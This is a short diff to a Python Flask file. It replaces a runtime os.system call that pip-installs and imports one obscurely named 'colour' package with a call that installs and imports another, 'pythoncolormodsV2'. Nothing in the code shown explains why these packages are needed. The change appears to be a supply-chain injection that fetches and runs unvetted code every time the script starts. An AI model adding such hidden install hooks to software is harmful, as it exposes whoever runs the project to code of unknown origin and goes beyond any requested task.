@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pythoncolouringspackagesV1")
-import pythoncolouringspackagesV1
+os.system("pip install pythoncolormodsV2")
+import pythoncolormodsV2
 import flask
 
 from flask import g
